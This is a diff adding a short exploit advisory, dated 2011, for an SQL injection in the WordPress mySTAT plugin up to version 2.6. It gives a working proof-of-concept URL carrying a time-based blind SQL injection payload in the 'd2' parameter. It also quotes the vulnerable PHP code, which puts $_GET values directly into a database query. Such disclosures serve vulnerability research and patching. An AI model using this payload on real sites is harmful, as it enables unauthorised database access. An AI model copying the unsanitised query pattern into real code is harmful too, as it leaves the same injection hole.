@@ -1,0 +1,27 @@
+# Exploit Title: WordPress mySTAT plugin <= 2.6 SQL Injection Vulnerability
+# Date: 2011-08-28
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/mystat.2.6.zip
+# Version: 2.6 (tested)
+# Note: magic_quotes has to be turned off
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/mystat/mystat.php?act=stat_img&d1=1&d2=-1') AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+
+---------------
+Vulnerable code
+---------------
+if(isset($_GET['act'])){
+    ...
+    if ($_GET['act'] == 'stat_img') {
+        myStat_stat_image();
+        exit();
+    };
+};
+
+function myStat_stat_image(){
+    ...
+    if(substr($_GET['d1'],0,10)!=substr($_GET['d2'],0,10)){
+        $var=$cmn->getSQL("SELECT DATE_FORMAT(date,'%d-%m-%y'),count(*),sum(count),TO_DAYS(date) FROM `%%PREFIX%%myStat_main` WHERE date > ('".$_GET['d1']."') AND date < ('".$_GET['d2']."') GROUP BY TO_DAYS(date) ORDER BY date DESC LIMIT 0,30;");
